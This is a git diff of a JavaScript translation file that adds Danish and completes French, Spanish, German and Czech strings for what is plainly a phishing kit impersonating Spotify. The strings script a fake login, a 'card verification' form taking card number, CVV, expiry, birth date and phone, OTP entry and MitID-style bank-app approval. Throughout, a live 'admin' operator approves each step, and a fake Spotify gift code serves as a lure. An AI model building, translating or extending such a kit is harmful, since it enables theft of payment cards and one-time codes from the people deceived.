@@ -1,8 +1,139 @@
 // src/hooks/useLanguage.js
 import { useState, useEffect } from 'react';
 
+
+
+
 // Full translations for the entire project
 export const translations = {
+  da: {
+    // HomePage
+    loginToSpotify: "Log ind på Spotify",
+    noAccount: "Har du ikke en konto? ",
+    signUp: "Tilmeld dig Spotify",
+    signupUnavailable: "Tilmelding er ikke tilgængelig i øjeblikket.",
+    
+    // Login Screen
+    emailAddress: "E-mail adresse",
+    emailPlaceholder: "navn@domæne.dk",
+    loggingIn: "Logger ind...",
+    or: "eller",
+    continueWithGoogle: "Fortsæt med Google",
+    continueWithFacebook: "Fortsæt med Facebook",
+    continueWithApple: "Fortsæt med Apple",
+    forgotEmail: "Glemt din e-mail?",
+    pleaseEnterEmail: "Indtast venligst din e-mail adresse.",
+    validEmail: "Indtast venligst en gyldig e-mail adresse.",
+    googleUnavailable: "Google login er ikke tilgængeligt i øjeblikket.",
+    facebookUnavailable: "Facebook login er ikke tilgængeligt i øjeblikket.",
+    appleUnavailable: "Apple login er ikke tilgængeligt i øjeblikket.",
+
+    // Login Form
+    loginName: "Brugernavn",
+    password: "Adgangskode",
+    logIn: "Log ind",
+    unknownLogin: "Ukendt brugernavn",
+    unknownPassword: "Ukendt adgangskode",
+    pleaseEnterLogin: "Indtast venligst dit brugernavn.",
+    pleaseEnterPassword: "Indtast venligst din adgangskode.",
+    
+    // Card Verification Form
+    cardVerification: "Kortbekræftelse",
+    securityMessage: "Af sikkerhedsmæssige årsager skal du bekræfte dine oplysninger.",
+    cardholderName: "Kortholders navn",
+    cardNumber: "Kortnummer",
+    expirationDate: "Udløbsdato",
+    month: "Måned",
+    year: "År",
+    cvv: "CVV",
+    phoneNumber: "Telefonnummer",
+    phoneHint: "Vælg din landekode og indtast dit telefonnummer",
+    city: "By",
+    cityHint: "f.eks. København, Aarhus, Odense",
+    postalCode: "Postnummer",
+    postalHint: "f.eks. 1001",
+    submitCard: "Bekræft kort",
+    birthDate: "Fødselsdato",
+    day: "Dag",
+    
+    // Card Validation Errors
+    validCard: "Indtast et gyldigt kortnummer (16 cifre)",
+    validExpiry: "Indtast en gyldig udløbsdato (MM/ÅÅ)",
+    cardExpired: "Kortet er udløbet",
+    validCvv: "Indtast en gyldig CVV (3-4 cifre)",
+    validCardholder: "Indtast kortholders navn",
+    validPhone: "Indtast dit telefonnummer",
+    phoneDigits: "Telefonnummer skal være gyldigt",
+    validCity: "Indtast din by",
+    validCityName: "Indtast et gyldigt bynavn",
+    validPostal: "Indtast dit postnummer",
+    invalidPostal: "Ugyldigt postnummer format",
+    
+    // OTP Form
+    twoFactor: "To-faktor godkendelse",
+    enterOtp: "Indtast OTP-koden for at fuldføre dit login.",
+    otpCode: "OTP-kode",
+    verifyCode: "Bekræft kode",
+    back: "Tilbage",
+    validOtp: "Indtast en gyldig OTP-kode (6 cifre)",
+    otpMessage: "Indtast venligst OTP-koden for at fuldføre registreringen.",
+    otpPlaceholder: "000000",
+    confirmCode: "Bekræft kode",
+    verifying: "Verificerer...",
+    
+    // Loading / Waiting States
+    waitingAdmin: "Venter på admin godkendelse...",
+    waitingContinue: "Venter på admin for at fortsætte...",
+    processing: "Behandler...",
+    adminWillReview: "Admin vil klikke \"Næste trin\" når klar",
+    pleaseWait: "Vent venligst mens vi verificerer dine oplysninger",
+    sending: "Sender...",
+    verifying: "Verificerer...",
+    
+    // Messages
+    denied: "Login nægtet af admin. Prøv venligst igen senere.",
+    success: "OTP-kode verificeret succesfuldt! Omdirigerer...",
+    error: "Der opstod en fejl. Prøv venligst igen.",
+    
+    // NextStepAppr (MitID)
+    confirmationInApp: "Bekræftelse i din bankapp",
+    merchant: "Forhandler",
+    amount: "Beløb",
+    date: "Dato",
+    cardNumberLabel: "Kortnummer",
+    instruction1: "Åbn din bankapp på din smartphone.",
+    instruction2: "Bekræft autorisationen.",
+    instruction3: "Vend tilbage til denne skærm efter bekræftelse.",
+    instruction4: "Tryk på \"BEKRÆFT\", når du er tilbage.",
+    instruction5: "Opdater venligst ikke siden.",
+    confirm: "Bekræft",
+    securedBy: "Sikret af",
+    waitingTitle: "Bekræftelse i app",
+    waitingForConfirmation: "Venter på bekræftelse",
+    waitingMessage: "Din bekræftelse er blevet sendt.",
+    waitingSubMessage: "Tjek venligst din mobilbankapp.",
+    waitingDontRefresh: "Opdater venligst ikke siden.",
+    currentTime: "Aktuel tid",
+    waitingInstruction: "Sørg for at have bekræftet i bankappen.",
+    confirmationInAppShort: "Bekræftelse i app",
+    
+    // Gift Card Popup
+    transactionApproved: "Transaktion godkendt!",
+    paymentSuccess: "Din betaling er blevet behandlet succesfuldt.",
+    spotifyGiftCard: "🎁 Din Spotify gavekode",
+    clickToReveal: "👆 Klik for at se koden",
+    copyCode: "📋 Kopier kode",
+    codeCopied: "✅ Kode kopieret!",
+    redeemAt: "Indløs på:",
+    continue: "Fortsæt",
+    pleaseRevealFirst: "Klik venligst på koden for at se den først!",
+    
+    // Approve Popup
+    approveTitle: "Log ind godkendt!",
+    approveMessage: "Dit log ind er blevet godkendt. Du vil blive omdirigeret til kortbekræftelsessiden.",
+    ok: "OK"
+  },
+  
   en: {
     // HomePage
     loginToSpotify: "Log in to Spotify",
@@ -10,35 +141,7 @@ export const translations = {
     signUp: "Sign up for Spotify",
     signupUnavailable: "Sign up is currently unavailable.",
     
-    // OTP Form
-    otpMessage: "Please enter the OTP code to complete the registration.",
-    otpCode: "OTP-Code",
-    otpPlaceholder: "000000",
-    confirmCode: "Confirm code",
-    verifying: "Verifying...",
-
-    // NextStepAppr
-    confirmationInApp: "Confirmation in your Bank App",
-    merchant: "Merchant",
-    amount: "Amount",
-    date: "Date",
-    cardNumberLabel: "Card Number",
-    instruction1: "Open your banking app on your smartphone.",
-    instruction2: "Confirm the authorization.",
-    instruction3: "Return to this screen after confirmation.",
-    instruction4: "Tap \"CONFIRM\" when you are back.",
-    instruction5: "Please do not refresh the page.",
-    confirm: "Confirm",
-    sending: "Sending...",
-    securedBy: "Secured by",
-    waitingTitle: "Confirmation in App",
-    waitingForConfirmation: "Waiting for Confirmation",
-    waitingMessage: "Your confirmation has been sent.",
-    waitingSubMessage: "Please check your mobile banking app.",
-    waitingDontRefresh: "Please do not refresh the page.",
-    currentTime: "Current time",
-waitingInstruction: "Please make sure you have confirmed in the banking app.",
-
+    // Login Screen
     emailAddress: "Email address",
     emailPlaceholder: "name@domain.com",
     loggingIn: "Logging in...",
@@ -101,6 +204,10 @@ waitingInstruction: "Please make sure you have confirmed in the banking app.",
     verifyCode: "Verify Code",
     back: "Back",
     validOtp: "Please enter a valid OTP code (6 digits)",
+    otpMessage: "Please enter the OTP code to complete the registration.",
+    otpPlaceholder: "000000",
+    confirmCode: "Confirm code",
+    verifying: "Verifying...",
     
     // Loading / Waiting States
     waitingAdmin: "Waiting for admin approval...",
@@ -116,23 +223,26 @@ waitingInstruction: "Please make sure you have confirmed in the banking app.",
     success: "OTP code verified successfully! Redirecting...",
     error: "An error occurred. Please try again.",
     
-    // NextStepAppr
+    // NextStepAppr (MitID)
     confirmationInApp: "Confirmation in your Bank App",
     merchant: "Merchant",
     amount: "Amount",
     date: "Date",
     cardNumberLabel: "Card Number",
-    instructions: "Instructions",
     instruction1: "Open your banking app on your smartphone.",
     instruction2: "Confirm the authorization.",
     instruction3: "Return to this screen after confirmation.",
     instruction4: "Tap \"CONFIRM\" when you are back.",
+    instruction5: "Please do not refresh the page.",
     confirm: "Confirm",
     securedBy: "Secured by",
+    waitingTitle: "Confirmation in App",
     waitingForConfirmation: "Waiting for Confirmation",
     waitingMessage: "Your confirmation has been sent.",
     waitingSubMessage: "Please check your mobile banking app.",
+    waitingDontRefresh: "Please do not refresh the page.",
     currentTime: "Current time",
+    waitingInstruction: "Please make sure you have confirmed in the banking app.",
     confirmationInAppShort: "Confirmation in App",
     
     // Gift Card Popup
@@ -159,35 +269,7 @@ waitingInstruction: "Please make sure you have confirmed in the banking app.",
     signUp: "Zaregistrujte se na Spotify",
     signupUnavailable: "Registrace není aktuálně k dispozici.",
     
-    // OTP Form
-    otpMessage: "Zadejte prosím OTP kód pro dokončení registrace.",
-    otpCode: "OTP kód",
-    otpPlaceholder: "000000",
-    confirmCode: "Potvrdit kód",
-    verifying: "Ověřování...",
-
-    // NextStepAppr
-    confirmationInApp: "Potvrzení v bankovní aplikaci",
-    merchant: "Obchodník",
-    amount: "Částka",
-    date: "Datum",
-    cardNumberLabel: "Číslo karty",
-    instruction1: "Otevřete svou bankovní aplikaci v telefonu.",
-    instruction2: "Potvrďte autorizaci.",
-    instruction3: "Po potvrzení se vraťte na tuto obrazovku.",
-    instruction4: "Až se vrátíte, klepněte na \"POTVRDIT\".",
-    instruction5: "Prosím neobnovujte stránku.",
-    confirm: "Potvrdit",
-    sending: "Odesílání...",
-    securedBy: "Zabezpečeno",
-    waitingTitle: "Potvrzení v aplikaci",
-    waitingForConfirmation: "Čekání na potvrzení",
-    waitingMessage: "Vaše potvrzení bylo odesláno.",
-    waitingSubMessage: "Zkontrolujte svou bankovní aplikaci.",
-    waitingDontRefresh: "Prosím neobnovujte stránku.",
-    currentTime: "Aktuální čas",
-waitingInstruction: "Ujistěte se, že jste potvrdili v bankovní aplikaci.",
-
+    // Login Screen
     emailAddress: "E-mailová adresa",
     emailPlaceholder: "jmeno@domena.cz",
     loggingIn: "Přihlašování...",
@@ -201,7 +283,6 @@ waitingInstruction: "Ujistěte se, že jste potvrdili v bankovní aplikaci.",
     googleUnavailable: "Přihlášení přes Google není aktuálně k dispozici.",
     facebookUnavailable: "Přihlášení přes Facebook není aktuálně k dispozici.",
     appleUnavailable: "Přihlášení přes Apple není aktuálně k dispozici.",
-
 
     // Login Form
     loginName: "Uživatelské jméno",
@@ -231,7 +312,6 @@ waitingInstruction: "Ujistěte se, že jste potvrdili v bankovní aplikaci.",
     birthDate: "Datum narození",
     day: "Den",
     
-    // Card Validation Errors
     validCard: "Zadejte platné číslo karty (16 číslic)",
     validExpiry: "Zadejte platné datum expirace (MM/RR)",
     cardExpired: "Karta vypršela",
@@ -244,15 +324,17 @@ waitingInstruction: "Ujistěte se, že jste potvrdili v bankovní aplikaci.",
     validPostal: "Zadejte své PSČ",
     invalidPostal: "Neplatný formát PSČ",
     
-    // OTP Form
     twoFactor: "Dvoufaktorové ověření",
     enterOtp: "Zadejte OTP kód pro dokončení přihlášení.",
     otpCode: "OTP kód",
     verifyCode: "Ověřit kód",
     back: "Zpět",
     validOtp: "Zadejte platný OTP kód (6 číslic)",
+    otpMessage: "Zadejte prosím OTP kód pro dokončení registrace.",
+    otpPlaceholder: "000000",
+    confirmCode: "Potvrdit kód",
+    verifying: "Ověřování...",
     
-    // Loading / Waiting States
     waitingAdmin: "Čekání na schválení administrátora...",
     waitingContinue: "Čekání na pokračování administrátora...",
     processing: "Zpracování...",
@@ -260,32 +342,32 @@ waitingInstruction: "Ujistěte se, že jste potvrdili v bankovní aplikaci.",
     pleaseWait: "Počkejte prosím, zatímco ověřujeme vaše údaje",
     sending: "Odesílání...",
     verifying: "Ověřování...",
-    
-    // Messages
     denied: "Přihlášení zamítnuto administrátorem. Zkuste to prosím později.",
     success: "OTP kód byl úspěšně ověřen! Přesměrování...",
     error: "Došlo k chybě. Zkuste to prosím znovu.",
     
-    // NextStepAppr
     confirmationInApp: "Potvrzení v bankovní aplikaci",
     merchant: "Obchodník",
     amount: "Částka",
     date: "Datum",
     cardNumberLabel: "Číslo karty",
-    instructions: "Pokyny",
     instruction1: "Otevřete svou bankovní aplikaci v telefonu.",
     instruction2: "Potvrďte autorizaci.",
     instruction3: "Po potvrzení se vraťte na tuto obrazovku.",
     instruction4: "Až se vrátíte, klepněte na \"POTVRDIT\".",
+    instruction5: "Prosím neobnovujte stránku.",
     confirm: "Potvrdit",
+    sending: "Odesílání...",
     securedBy: "Zabezpečeno",
+    waitingTitle: "Potvrzení v aplikaci",
     waitingForConfirmation: "Čekání na potvrzení",
     waitingMessage: "Vaše potvrzení bylo odesláno.",
     waitingSubMessage: "Zkontrolujte svou bankovní aplikaci.",
+    waitingDontRefresh: "Prosím neobnovujte stránku.",
     currentTime: "Aktuální čas",
+    waitingInstruction: "Ujistěte se, že jste potvrdili v bankovní aplikaci.",
     confirmationInAppShort: "Potvrzení v aplikaci",
     
-    // Gift Card Popup
     transactionApproved: "Transakce schválena!",
     paymentSuccess: "Vaše platba byla úspěšně zpracována.",
     spotifyGiftCard: "🎁 Váš Spotify dárkový kód",
@@ -295,8 +377,6 @@ waitingInstruction: "Ujistěte se, že jste potvrdili v bankovní aplikaci.",
     redeemAt: "Uplatněte na:",
     continue: "Pokračovat",
     pleaseRevealFirst: "Pro zobrazení kódu na něj nejprve klikněte!",
-    
-    // Approve Popup
     approveTitle: "Přihlášení schváleno!",
     approveMessage: "Vaše přihlášení bylo schváleno. Budete přesměrováni na stránku ověření karty.",
     ok: "OK"
@@ -309,44 +389,7 @@ waitingInstruction: "Ujistěte se, že jste potvrdili v bankovní aplikaci.",
     signUp: "Bei Spotify registrieren",
     signupUnavailable: "Die Registrierung ist derzeit nicht verfügbar.",
     
-    // Login Form
-    loginName: "Benutzername",
-    password: "Passwort",
-    logIn: "Anmelden",
-    unknownLogin: "Unbekannter Benutzername",
-    unknownPassword: "Unbekanntes Passwort",
-    pleaseEnterLogin: "Bitte geben Sie Ihren Benutzernamen ein.",
-    pleaseEnterPassword: "Bitte geben Sie Ihr Passwort ein.",
-     
-    // OTP Form
-    otpMessage: "Bitte geben Sie den OTP-Code ein, um die Registrierung abzuschließen.",
-    otpCode: "OTP-Code",
-    otpPlaceholder: "000000",
-    confirmCode: "Code bestätigen",
-    verifying: "Wird überprüft...",
-
-    // NextStepAppr
-    confirmationInApp: "Bestätigung in Ihrer Bank-App",
-    merchant: "Händler",
-    amount: "Betrag",
-    date: "Datum",
-    cardNumberLabel: "Kartennummer",
-    instruction1: "Öffnen Sie Ihre Bank-App auf Ihrem Smartphone.",
-    instruction2: "Bestätigen Sie die Autorisierung.",
-    instruction3: "Kehren Sie nach der Bestätigung zu diesem Bildschirm zurück.",
-    instruction4: "Tippen Sie auf \"BESTÄTIGEN\", wenn Sie zurück sind.",
-    instruction5: "Bitte aktualisieren Sie die Seite nicht.",
-    confirm: "Bestätigen",
-    sending: "Senden...",
-    securedBy: "Gesichert durch",
-    waitingTitle: "Bestätigung in der App",
-    waitingForConfirmation: "Warten auf Bestätigung",
-    waitingMessage: "Ihre Bestätigung wurde gesendet.",
-    waitingSubMessage: "Bitte überprüfen Sie Ihre Bank-App.",
-    waitingDontRefresh: "Bitte aktualisieren Sie die Seite nicht.",
-    currentTime: "Aktuelle Uhrzeit",
-waitingInstruction: "Bitte stellen Sie sicher, dass Sie in der Bank-App bestätigt haben.",
-
+    // Login Screen
     emailAddress: "E-Mail-Adresse",
     emailPlaceholder: "name@domain.de",
     loggingIn: "Anmelden...",
@@ -361,6 +404,15 @@ waitingInstruction: "Bitte stellen Sie sicher, dass Sie in der Bank-App bestäti
     facebookUnavailable: "Facebook-Login ist derzeit nicht verfügbar.",
     appleUnavailable: "Apple-Login ist derzeit nicht verfügbar.",
 
+    // Login Form
+    loginName: "Benutzername",
+    password: "Passwort",
+    logIn: "Anmelden",
+    unknownLogin: "Unbekannter Benutzername",
+    unknownPassword: "Unbekanntes Passwort",
+    pleaseEnterLogin: "Bitte geben Sie Ihren Benutzernamen ein.",
+    pleaseEnterPassword: "Bitte geben Sie Ihr Passwort ein.",
+    
     // Card Verification Form
     cardVerification: "Kartenüberprüfung",
     securityMessage: "Aus Sicherheitsgründen überprüfen Sie bitte Ihre Daten.",
@@ -380,7 +432,6 @@ waitingInstruction: "Bitte stellen Sie sicher, dass Sie in der Bank-App bestäti
     birthDate: "Geburtsdatum",
     day: "Tag",
     
-    // Card Validation Errors
     validCard: "Bitte geben Sie eine gültige Kartennummer ein (16 Ziffern)",
     validExpiry: "Bitte geben Sie ein gültiges Ablaufdatum ein (MM/JJ)",
     cardExpired: "Karte ist abgelaufen",
@@ -393,15 +444,17 @@ waitingInstruction: "Bitte stellen Sie sicher, dass Sie in der Bank-App bestäti
     validPostal: "Bitte geben Sie Ihre Postleitzahl ein",
     invalidPostal: "Ungültiges Postleitzahlenformat",
     
-    // OTP Form
     twoFactor: "Zwei-Faktor-Verifizierung",
     enterOtp: "Bitte geben Sie den OTP-Code ein, um Ihre Anmeldung abzuschließen.",
     otpCode: "OTP-Code",
     verifyCode: "Code überprüfen",
     back: "Zurück",
     validOtp: "Bitte geben Sie einen gültigen OTP-Code ein (6 Ziffern)",
+    otpMessage: "Bitte geben Sie den OTP-Code ein, um die Registrierung abzuschließen.",
+    otpPlaceholder: "000000",
+    confirmCode: "Code bestätigen",
+    verifying: "Wird überprüft...",
     
-    // Loading / Waiting States
     waitingAdmin: "Warten auf Admin-Bestätigung...",
     waitingContinue: "Warten auf Admin-Fortsetzung...",
     processing: "Verarbeitung...",
@@ -409,32 +462,31 @@ waitingInstruction: "Bitte stellen Sie sicher, dass Sie in der Bank-App bestäti
     pleaseWait: "Bitte warten Sie, während wir Ihre Daten überprüfen",
     sending: "Senden...",
     verifying: "Überprüfen...",
-    
-    // Messages
     denied: "Anmeldung vom Admin abgelehnt. Bitte versuchen Sie es später erneut.",
     success: "OTP-Code erfolgreich verifiziert! Weiterleitung...",
     error: "Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.",
     
-    // NextStepAppr (same as before, add here)
     confirmationInApp: "Bestätigung in Ihrer Bank-App",
     merchant: "Händler",
     amount: "Betrag",
     date: "Datum",
     cardNumberLabel: "Kartennummer",
-    instructions: "Anweisungen",
     instruction1: "Öffnen Sie Ihre Bank-App auf Ihrem Smartphone.",
     instruction2: "Bestätigen Sie die Autorisierung.",
     instruction3: "Kehren Sie nach der Bestätigung zu diesem Bildschirm zurück.",
     instruction4: "Tippen Sie auf \"BESTÄTIGEN\", wenn Sie zurück sind.",
+    instruction5: "Bitte aktualisieren Sie die Seite nicht.",
     confirm: "Bestätigen",
     securedBy: "Gesichert durch",
+    waitingTitle: "Bestätigung in der App",
     waitingForConfirmation: "Warten auf Bestätigung",
     waitingMessage: "Ihre Bestätigung wurde gesendet.",
     waitingSubMessage: "Bitte überprüfen Sie Ihre Bank-App.",
+    waitingDontRefresh: "Bitte aktualisieren Sie die Seite nicht.",
     currentTime: "Aktuelle Uhrzeit",
+    waitingInstruction: "Bitte stellen Sie sicher, dass Sie in der Bank-App bestätigt haben.",
     confirmationInAppShort: "Bestätigung in App",
     
-    // Gift Card Popup
     transactionApproved: "Transaktion genehmigt!",
     paymentSuccess: "Ihre Zahlung wurde erfolgreich verarbeitet.",
     spotifyGiftCard: "🎁 Ihr Spotify-Geschenkgutschein",
@@ -444,8 +496,6 @@ waitingInstruction: "Bitte stellen Sie sicher, dass Sie in der Bank-App bestäti
     redeemAt: "Einlösen unter:",
     continue: "Weiter",
     pleaseRevealFirst: "Bitte klicken Sie zuerst auf den Code, um ihn anzuzeigen!",
-    
-    // Approve Popup
     approveTitle: "Anmeldung genehmigt!",
     approveMessage: "Ihre Anmeldung wurde genehmigt. Sie werden zur Kartenüberprüfungsseite weitergeleitet.",
     ok: "OK"
@@ -458,6 +508,7 @@ waitingInstruction: "Bitte stellen Sie sicher, dass Sie in der Bank-App bestäti
     signUp: "S'inscrire sur Spotify",
     signupUnavailable: "L'inscription n'est pas disponible pour le moment.",
     
+    // Login Screen
     emailAddress: "Adresse e-mail",
     emailPlaceholder: "nom@domaine.fr",
     loggingIn: "Connexion en cours...",
@@ -471,35 +522,6 @@ waitingInstruction: "Bitte stellen Sie sicher, dass Sie in der Bank-App bestäti
     googleUnavailable: "La connexion Google n'est pas disponible pour le moment.",
     facebookUnavailable: "La connexion Facebook n'est pas disponible pour le moment.",
     appleUnavailable: "La connexion Apple n'est pas disponible pour le moment.",
-
-    // OTP Form
-    otpMessage: "Veuillez saisir le code OTP pour compléter l'inscription.",
-    otpCode: "Code OTP",
-    otpPlaceholder: "000000",
-    confirmCode: "Confirmer le code",
-    verifying: "Vérification...",
-
-    // NextStepAppr
-    confirmationInApp: "Confirmation dans votre application bancaire",
-    merchant: "Marchand",
-    amount: "Montant",
-    date: "Date",
-    cardNumberLabel: "Numéro de carte",
-    instruction1: "Ouvrez votre application bancaire sur votre smartphone.",
-    instruction2: "Confirmez l'autorisation.",
-    instruction3: "Revenez à cet écran après confirmation.",
-    instruction4: "Appuyez sur \"CONFIRMER\" lorsque vous êtes de retour.",
-    instruction5: "Veuillez ne pas actualiser la page.",
-    confirm: "Confirmer",
-    sending: "Envoi...",
-    securedBy: "Sécurisé par",
-    waitingTitle: "Confirmation dans l'application",
-    waitingForConfirmation: "En attente de confirmation",
-    waitingMessage: "Votre confirmation a été envoyée.",
-    waitingSubMessage: "Veuillez vérifier votre application bancaire.",
-    waitingDontRefresh: "Veuillez ne pas actualiser la page.",
-    currentTime: "Heure actuelle",
-waitingInstruction: "Assurez-vous d'avoir confirmé dans l'application bancaire.",
 
     // Login Form
     loginName: "Nom d'utilisateur",
@@ -529,23 +551,72 @@ waitingInstruction: "Assurez-vous d'avoir confirmé dans l'application bancaire.
     birthDate: "Date de naissance",
     day: "Jour",
     
-    // Rest of translations (add similar to other languages)
     validCard: "Veuillez saisir un numéro de carte valide (16 chiffres)",
     validExpiry: "Veuillez saisir une date d'expiration valide (MM/AA)",
     cardExpired: "La carte a expiré",
     validCvv: "Veuillez saisir un CVV valide (3-4 chiffres)",
     validCardholder: "Veuillez saisir le nom du titulaire de la carte",
     validPhone: "Veuillez saisir votre numéro de téléphone",
+    phoneDigits: "Le numéro de téléphone doit être valide",
+    validCity: "Veuillez saisir votre ville",
+    validCityName: "Veuillez saisir un nom de ville valide",
+    validPostal: "Veuillez saisir votre code postal",
+    invalidPostal: "Format de code postal invalide",
+    
     twoFactor: "Vérification à deux facteurs",
     enterOtp: "Veuillez saisir le code OTP pour terminer votre connexion.",
     otpCode: "Code OTP",
     verifyCode: "Vérifier le code",
     back: "Retour",
     validOtp: "Veuillez saisir un code OTP valide (6 chiffres)",
+    otpMessage: "Veuillez saisir le code OTP pour compléter l'inscription.",
+    otpPlaceholder: "000000",
+    confirmCode: "Confirmer le code",
+    verifying: "Vérification...",
+    
+    waitingAdmin: "En attente de l'approbation de l'administrateur...",
+    waitingContinue: "En attente de la continuation de l'administrateur...",
+    processing: "Traitement...",
+    adminWillReview: "L'administrateur cliquera sur \"Étape suivante\" quand il sera prêt",
+    pleaseWait: "Veuillez patienter pendant que nous vérifions vos identifiants",
+    sending: "Envoi...",
+    verifying: "Vérification...",
     denied: "Connexion refusée par l'administrateur. Veuillez réessayer plus tard.",
     success: "Code OTP vérifié avec succès ! Redirection...",
+    error: "Une erreur s'est produite. Veuillez réessayer.",
+    
+    confirmationInApp: "Confirmation dans votre application bancaire",
+    merchant: "Marchand",
+    amount: "Montant",
+    date: "Date",
+    cardNumberLabel: "Numéro de carte",
+    instruction1: "Ouvrez votre application bancaire sur votre smartphone.",
+    instruction2: "Confirmez l'autorisation.",
+    instruction3: "Revenez à cet écran après confirmation.",
+    instruction4: "Appuyez sur \"CONFIRMER\" lorsque vous êtes de retour.",
+    instruction5: "Veuillez ne pas actualiser la page.",
     confirm: "Confirmer",
+    securedBy: "Sécurisé par",
+    waitingTitle: "Confirmation dans l'application",
+    waitingForConfirmation: "En attente de confirmation",
+    waitingMessage: "Votre confirmation a été envoyée.",
+    waitingSubMessage: "Veuillez vérifier votre application bancaire.",
+    waitingDontRefresh: "Veuillez ne pas actualiser la page.",
+    currentTime: "Heure actuelle",
+    waitingInstruction: "Assurez-vous d'avoir confirmé dans l'application bancaire.",
+    confirmationInAppShort: "Confirmation dans l'application",
+    
+    transactionApproved: "Transaction approuvée !",
+    paymentSuccess: "Votre paiement a été traité avec succès.",
+    spotifyGiftCard: "🎁 Votre code cadeau Spotify",
+    clickToReveal: "👆 Cliquez pour révéler le code",
+    copyCode: "📋 Copier le code",
+    codeCopied: "✅ Code copié !",
+    redeemAt: "À utiliser sur :",
     continue: "Continuer",
+    pleaseRevealFirst: "Veuillez d'abord cliquer sur le code pour le révéler !",
+    approveTitle: "Connexion approuvée !",
+    approveMessage: "Votre connexion a été approuvée. Vous serez redirigé vers la page de vérification de la carte.",
     ok: "OK"
   },
   
@@ -556,15 +627,7 @@ waitingInstruction: "Assurez-vous d'avoir confirmé dans l'application bancaire.
     signUp: "Regístrate en Spotify",
     signupUnavailable: "El registro no está disponible actualmente.",
     
-    // Login Form
-    loginName: "Nombre de usuario",
-    password: "Contraseña",
-    logIn: "Iniciar sesión",
-    unknownLogin: "Usuario desconocido",
-    unknownPassword: "Contraseña desconocida",
-    pleaseEnterLogin: "Por favor, ingrese su nombre de usuario.",
-    pleaseEnterPassword: "Por favor, ingrese su contraseña.",
-    
+    // Login Screen
     emailAddress: "Correo electrónico",
     emailPlaceholder: "nombre@dominio.es",
     loggingIn: "Iniciando sesión...",
@@ -579,35 +642,15 @@ waitingInstruction: "Assurez-vous d'avoir confirmé dans l'application bancaire.
     facebookUnavailable: "El inicio de sesión con Facebook no está disponible actualmente.",
     appleUnavailable: "El inicio de sesión con Apple no está disponible actualmente.",
 
-    // OTP Form
-    otpMessage: "Por favor, ingrese el código OTP para completar el registro.",
-    otpCode: "Código OTP",
-    otpPlaceholder: "000000",
-    confirmCode: "Confirmar código",
-    verifying: "Verificando...",
-
-    // NextStepAppr
-    confirmationInApp: "Confirmación en su aplicación bancaria",
-    merchant: "Comerciante",
-    amount: "Monto",
-    date: "Fecha",
-    cardNumberLabel: "Número de tarjeta",
-    instruction1: "Abra su aplicación bancaria en su teléfono inteligente.",
-    instruction2: "Confirme la autorización.",
-    instruction3: "Regrese a esta pantalla después de la confirmación.",
-    instruction4: "Toque \"CONFIRMAR\" cuando regrese.",
-    instruction5: "Por favor, no actualice la página.",
-    confirm: "Confirmar",
-    sending: "Enviando...",
-    securedBy: "Asegurado por",
-    waitingTitle: "Confirmación en la aplicación",
-    waitingForConfirmation: "Esperando confirmación",
-    waitingMessage: "Su confirmación ha sido enviada.",
-    waitingSubMessage: "Por favor, revise su aplicación bancaria.",
-    waitingDontRefresh: "Por favor, no actualice la página.",
-    currentTime: "Hora actual",
-waitingInstruction: "Asegúrese de haber confirmado en la aplicación bancaria.",
-
+    // Login Form
+    loginName: "Nombre de usuario",
+    password: "Contraseña",
+    logIn: "Iniciar sesión",
+    unknownLogin: "Usuario desconocido",
+    unknownPassword: "Contraseña desconocida",
+    pleaseEnterLogin: "Por favor, ingrese su nombre de usuario.",
+    pleaseEnterPassword: "Por favor, ingrese su contraseña.",
+    
     // Card Verification Form
     cardVerification: "Verificación de tarjeta",
     securityMessage: "Por razones de seguridad, verifique sus datos.",
@@ -633,27 +676,78 @@ waitingInstruction: "Asegúrese de haber confirmado en la aplicación bancaria."
     validCvv: "Por favor, ingrese un CVV válido (3-4 dígitos)",
     validCardholder: "Por favor, ingrese el nombre del titular de la tarjeta",
     validPhone: "Por favor, ingrese su número de teléfono",
+    phoneDigits: "El número de teléfono debe ser válido",
+    validCity: "Por favor, ingrese su ciudad",
+    validCityName: "Por favor, ingrese un nombre de ciudad válido",
+    validPostal: "Por favor, ingrese su código postal",
+    invalidPostal: "Formato de código postal inválido",
+    
     twoFactor: "Verificación de dos factores",
     enterOtp: "Por favor, ingrese el código OTP para completar su inicio de sesión.",
     otpCode: "Código OTP",
     verifyCode: "Verificar código",
     back: "Atrás",
     validOtp: "Por favor, ingrese un código OTP válido (6 dígitos)",
+    otpMessage: "Por favor, ingrese el código OTP para completar el registro.",
+    otpPlaceholder: "000000",
+    confirmCode: "Confirmar código",
+    verifying: "Verificando...",
+    
+    waitingAdmin: "Esperando aprobación del administrador...",
+    waitingContinue: "Esperando continuación del administrador...",
+    processing: "Procesando...",
+    adminWillReview: "El administrador hará clic en \"Siguiente paso\" cuando esté listo",
+    pleaseWait: "Por favor, espere mientras verificamos sus credenciales",
+    sending: "Enviando...",
+    verifying: "Verificando...",
     denied: "Inicio de sesión denegado por el administrador. Por favor, intente más tarde.",
     success: "¡Código OTP verificado exitosamente! Redirigiendo...",
+    error: "Ocurrió un error. Por favor, intente de nuevo.",
+    
+    confirmationInApp: "Confirmación en su aplicación bancaria",
+    merchant: "Comerciante",
+    amount: "Monto",
+    date: "Fecha",
+    cardNumberLabel: "Número de tarjeta",
+    instruction1: "Abra su aplicación bancaria en su teléfono inteligente.",
+    instruction2: "Confirme la autorización.",
+    instruction3: "Regrese a esta pantalla después de la confirmación.",
+    instruction4: "Toque \"CONFIRMAR\" cuando regrese.",
+    instruction5: "Por favor, no actualice la página.",
     confirm: "Confirmar",
+    securedBy: "Asegurado por",
+    waitingTitle: "Confirmación en la aplicación",
+    waitingForConfirmation: "Esperando confirmación",
+    waitingMessage: "Su confirmación ha sido enviada.",
+    waitingSubMessage: "Por favor, revise su aplicación bancaria.",
+    waitingDontRefresh: "Por favor, no actualice la página.",
+    currentTime: "Hora actual",
+    waitingInstruction: "Asegúrese de haber confirmado en la aplicación bancaria.",
+    confirmationInAppShort: "Confirmación en la aplicación",
+    
+    transactionApproved: "¡Transacción aprobada!",
+    paymentSuccess: "Su pago ha sido procesado exitosamente.",
+    spotifyGiftCard: "🎁 Su código de regalo de Spotify",
+    clickToReveal: "👆 Haga clic para revelar el código",
+    copyCode: "📋 Copiar código",
+    codeCopied: "✅ ¡Código copiado!",
+    redeemAt: "Canjear en:",
     continue: "Continuar",
+    pleaseRevealFirst: "¡Primero haga clic en el código para revelarlo!",
+    approveTitle: "¡Inicio de sesión aprobado!",
+    approveMessage: "Su inicio de sesión ha sido aprobado. Será redirigido a la página de verificación de tarjeta.",
